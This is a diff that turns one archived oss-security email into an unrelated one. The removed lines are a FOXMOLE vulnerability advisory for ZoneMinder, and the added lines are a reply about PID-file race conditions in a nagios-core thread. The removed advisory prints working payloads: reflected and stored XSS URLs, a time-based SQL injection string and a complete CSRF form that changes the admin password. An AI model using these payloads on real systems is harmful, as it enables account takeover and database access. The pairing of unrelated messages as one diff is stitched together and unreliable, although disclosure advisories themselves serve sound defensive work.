@@ -1,139 +1,48 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/02/02/18
-Message-ID: <ad74ed31-dcff-24b7-ae84-2421ad10b7ef@foxmole.com>
-Date: Thu, 2 Feb 2017 10:08:30 +0100
-From: FOXMOLE Advisories <advisories@...mole.com>
-To: fulldisclosure@...lists.org, bugtraq@...urityfocus.com, bugs@...uritytracker.com, submissions@...ketstormsecurity.org, oss-security@...ts.openwall.com
-Subject: [FOXMOLE SA 2016-07-05] ZoneMinder - Multiple Issues
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/09/07/7
+Message-ID: <877exa8oap.fsf@fifthhorseman.net>
+Date: Thu, 07 Sep 2017 12:29:50 -0400
+From: Daniel Kahn Gillmor <dkg@...thhorseman.net>
+To: Simon McVittie <smcv@...ian.org>, oss-security@...ts.openwall.com
+Subject: Re: CVE-2017-12847: nagios-core privilege escalation via PID file manipulation
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+On Thu 2017-09-07 16:27:25 +0100, Simon McVittie wrote:
+> Ideally, the sequence of events would be something that ensures that
+> the pid file already exists by the time readiness has been announced,
+> like this pseudocode:
+>
+>     have the necessary privileges to write a pid file
+>     fork
+>     if (parent) {
+>         write child pid to pid file
+>         exit    /* tells supervisor we are ready */
+>     }
+>     else /* child */ {
+>         drop privileges
+>         while (1) { process request }
+>     }
 
-=== FOXMOLE - Security Advisory 2016-07-05 ===
+Is there a potential race condition here?  for example, if dropping
+privileges takes some amount of time, or if there is additional setup
+that ought to be done as non-root (building tables, pre-processing a
+dataset from the filesystem, initializing a PRNG), then this pattern is
+actually pretty hard to get right as a notification.
 
-Zoneminder multiple vulnerabilities
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+the options seem to be:
 
-Affected Versions
-=================
-Zoneminder 1.29,1.30
+ 0) if dropping privs is known to be fast, then move any lengthy
+    initialization/setup into the root/pre-fork side.  this is a
+    violation of the principle of least privilege.
 
-Issue Overview
-==============
-Vulnerability Type: SQL Injection, Cross Site Scripting, Session Fixation, No CSRF Protection
-Technical Risk: high
-Likelihood of Exploitation: medium
-Vendor: Zoneminder
-Vendor URL: https://zoneminder.com/
-Credits: FOXMOLE employee Tim Herres
-Advisory URL: https://www.foxmole.com/advisories/foxmole-2016-07-05.txt
-Advisory Status: Public
-CVE-Number: NA
-CVE URL: NA
-OVE-ID:
-OVI-ID:
-CWE-ID: CWE-89
-CVSS 2.0: 4.3 (AV:N/AC:M/Au:N/C:P/I:N/A:N)
+ 1) establish a communication channel between the child and the parent,
+    and have the child explicitly signal to the parent that it is ready
+    so that the parent can exit() appropriately.
 
+but (1) is at least as much work as any of the other forms of explicit
+notification to the service manager directly, so it's not clear that
+forking is a great way to provide such notification.
 
-Impact
-======
-During an internal code review multiple vulnerabilities were identified.
-The whole application misses input validation and output encoding.
-This means user supplied input is inserted in an unsafe way.
-This could allow a remote attacker to easily compromise user accounts or access the database in an unsafe way.
+        --dkg
 
-Issue Description
-=================
-The following findings are only examples there are quite more. The whole application should be reviewed.
-
-All items tested using Firefox
-
-1)Cross Site Scripting (XSS)
-Reflected:
-http://192.168.241.131/zm/index.php?view=request&request=log&task=download&key=a9fef1f4&format=texty9fke%27%3Chtml%3E%3Chead%3E%3C/head%3E%3Cbody%3E%3Cscript%3Ealert(1)%3C%2fscript%3E%3C/body%3E%3C/html%3Eayn2h
-Reflected without authentication: http://192.168.241.131/zm/index.php/LSE4%22%3E%3Cscript%3Ealert(1)%3C/script%3ELSE
-Stored: Creating a new monitor using the name "Bla<script>alert(1)</script>". There is only a clientside protection.
-
-2)SQL Injection
-Example Url:http://192.168.241.131/zm/index.php
-Parameter: limit (POST)
-    Type: stacked queries
-    Title: MySQL > 5.0.11 stacked queries (SELECT - comment)
-    Payload: view=request&request=log&task=query&limit=100;(SELECT *
-FROM (SELECT(SLEEP(5)))OQkj)#&minTime=1466674406.084434
-Easy exploitable using sqlmap.
-
-3)Session Fixation
-After a successful authentication the Session Cookie ZMSESSID remains the same.
-Example: Cookie before the login = ZMSESSID=26ga0i62e4e51mhfcb68nk3dg2 after successful login
-ZMSESSID=26ga0i62e4e51mhfcb68nk3dg2
-
-4)No CSRF Proctection
-A possible CSRF attack form, which changes the password of the admin (uid=1), if the corresponding user activates it.
-<html>
-  <body>
-    <form action="http://192.168.241.131/zm/index.php" method="POST">
-      <input type="hidden" name="view" value="user" />
-      <input type="hidden" name="action" value="user" />
-      <input type="hidden" name="uid" value="1" />
-      <input type="hidden" name="newUser&#91;MonitorIds&#93;" value="" />
-      <input type="hidden" name="newUser&#91;Username&#93;" value="admin" />
-      <input type="hidden" name="newUser&#91;Password&#93;"
-value="admin1" />
-      <input type="hidden" name="conf&#95;password" value="admin1" />
-      <input type="hidden" name="newUser&#91;Language&#93;" value="" />
-      <input type="hidden" name="newUser&#91;Enabled&#93;" value="1" />
-      <input type="hidden" name="newUser&#91;Stream&#93;" value="View" />
-      <input type="hidden" name="newUser&#91;Events&#93;" value="Edit" />
-      <input type="hidden" name="newUser&#91;Control&#93;" value="Edit" />
-      <input type="hidden" name="newUser&#91;Monitors&#93;" value="Edit" />
-      <input type="hidden" name="newUser&#91;Groups&#93;" value="Edit" />
-      <input type="hidden" name="newUser&#91;System&#93;" value="Edit" />
-      <input type="hidden" name="newUser&#91;MaxBandwidth&#93;" value="" />
-      <input type="submit" value="Submit request" />
-    </form>
-  </body>
-</html>
-
-
-
-Temporary Workaround and Fix
-============================
-FOXMOLE advises to disable Zoneminder until the vendor publishes a complete fix.
-
-
-
-History
-=======
-2016-07-05  Issue discovered
-2016-11-22  Vendor contacted, no response
-2016-12-16  Vendor contacted again, still no response
-2017-01-17  Vendor contacted --> working on a patch
-2017-01-22  Vendor contacted, asked for an update and
-            declare advisory release to 2017-02-02 --> no response
-2017-02-02  Advisory Release
-
-
-GPG Signature
-=============
-This advisory is signed with the GPG key of the FOXMOLE advisories team.
-The key can be downloaded here: https://www.foxmole.com/advisories-key-3812092199E3277C.asc
-
------BEGIN PGP SIGNATURE-----
-
-iQIzBAEBCAAdFiEEjrQMZqTYqiY2IftqOBIJIZnjJ3wFAliS9w0ACgkQOBIJIZnj
-J3yAyhAA0EuT6UjSTVeK5V1nWgmzez9mLTHSfzykzDa+seGUArUjb7dOnqQ6C9O0
-21FKxIOOfBdK+CpuqAk0fm5P5CN9jFLqzTuh7+JLdWA8FDpEQdGIZD3iP6DEAh1q
-4e78ZA30u18imdtDjxBUO+cfgJPLFwIEr+cn7eEiIn+spW9Bd5g1RJEOAZT91feO
-o2rwBz917qRCWKa5I+RqSZj+5Ax4LFiVrvZDgMkihlb4Nvfrpg8ewBQfoATfyqF6
-j0ceZBKjLU3aEq4EE9ZvnbuzVLEraiZ+3xDwXdjF0BRKYS6XgRL2xWgr4ldsQ6sS
-glDyyU8QH8eh5UVAswebx9fKVARmog+34dX/ESJieI7A7s6N05IGpFrRcHPpjhRL
-Y3lNWj5+eSvpRSxf7pb9+KdTd8pZhgKK+MY+GulVIb8xtYYGvdju58Lmu23urV8v
-TuHwMOHsHtOzMRr1C8Z47EdTaUm8GsCqoeO8Z4L6ERg/ZZAuQqES26lLpQtCfMze
-HuGHkGGKVUi5s7BSMQqXiUNc3xipA39b0uqHw9OQpRRUixGl4rvAXTeYx6yBdiib
-tmi3/Oph6kWQjuFFhiFC8zrjJhmEtOLc4O+BweKx/WfgWQQ8JPCsznpD2J3ln8XD
-0lP0yuSO0CaJptLioYJhPr+m2SmGxY4rxSuu1cdrOJZfv9QkiLw=
-=/QtX
------END PGP SIGNATURE-----
+Download attachment "signature.asc" of type "application/pgp-signature" (833 bytes)
